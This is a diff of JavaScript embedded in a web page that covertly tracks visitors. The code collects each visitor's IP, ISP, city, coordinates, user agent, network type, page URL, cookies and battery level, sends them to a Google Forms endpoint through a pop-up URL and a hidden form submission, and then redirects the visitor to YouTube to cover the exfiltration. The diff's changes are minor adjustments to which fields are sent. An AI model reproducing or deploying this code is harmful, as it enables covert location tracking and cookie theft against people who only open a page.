@@ -39,7 +39,7 @@
    
 Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude;  
  
-setTimeout(() => window.open(`https://docs.google.com/forms/d/e/1FAIpQLSdMj_td6pP4Bucg5ILSf5D9qD5ucPlL8GPE_Zf7YDFWaop0sg/formResponse?entry.420308320=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org},${json.latitude},${json.longitude},${location.href}&entry.35905334=Device:${navigator.userAgent} ${f}`,"jv"),1000);
+setTimeout(() => window.open(`https://docs.google.com/forms/d/e/1FAIpQLSdMj_td6pP4Bucg5ILSf5D9qD5ucPlL8GPE_Zf7YDFWaop0sg/formResponse?entry.420308320=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org},${json.latitude},${json.longitude}&entry.35905334=Device:${navigator.userAgent} ${f}`,"jv"),1000);
 }   
     
     </script>
@@ -55,7 +55,7 @@ setTimeout(gB,2384);
    function Pj(){
      var X = document.getElementById("2");   
 var B = document.getElementById('HS-BB');
-    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie} "Charge":${B.innerHTML}`;
+    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${location.href} "cookie":${document.cookie} "Charge":${B.innerHTML}`;
  var Z =document.getElementById("form");
     Z.submit();  
   location.href="https://m.youtube.com";
